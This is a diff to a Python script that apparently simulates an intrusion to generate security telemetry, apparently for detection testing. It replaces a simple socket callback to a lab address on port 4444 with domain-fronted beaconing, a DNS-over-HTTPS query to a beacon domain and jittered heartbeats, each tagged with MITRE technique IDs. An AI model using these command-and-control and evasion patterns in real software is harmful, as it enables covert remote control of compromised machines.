@@ -16,6 +16,7 @@ import sys
 from pathlib import Path
 
 from telemetry_helper import check_environment, emit, EnvSafety, set_phase, jitter
+from c2_helper import emit_doh_query, emit_heartbeats, fronted_beacon, FRONT_DOMAINS
 
 import socket
 import struct
@@ -235,18 +236,23 @@ def main() -> int:
             emit("PROCESS", "CREATE_PROCESS", target, "WARNING",
                  source_process="winlogon_e.exe", error=str(e))
 
-    # Phase 7: Network callback
+    # Phase 7: Network callback (domain-fronted heartbeat)
     set_phase("c2_callback")
+    front = random.choice(FRONT_DOMAINS)
     emit("NETWORK", "CONNECT", "10.13.37.70:4444", "CRITICAL",
          source_process="winlogon_e.exe", protocol="TCP",
-         detail="Reverse shell callback attempt", technique_id="T1071.001")
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(2)
-        s.connect(("10.13.37.70", 4444))
-        s.close()
-    except Exception:
-        pass
+         detail=f"Reverse shell callback (fronted: {front})", technique_id="T1071.001")
+    emit("NETWORK", "DOMAIN_FRONT", front, "WARNING",
+         source_process="winlogon_e.exe", target_host=front, target_ip="10.13.37.70",
+         detail=f"Domain fronting callback via {front}", technique_id="T1090")
+
+    fronted_beacon("10.13.37.70", 4444, front,
+                   {"type": "reverse_shell", "session": "winlogon_e"})
+    emit_doh_query("beacon.telemetry-update.local", process_name="winlogon_e.exe")
+
+    emit_heartbeats("10.13.37.70", 4444, count=4,
+                    process_name="winlogon_e.exe",
+                    min_interval=4.0, max_interval=20.0)
 
     emit("PROCESS", "EXIT_PROCESS", "winlogon_e.exe", "INFO",
          source_process="winlogon_e.exe", persistence_methods=4)
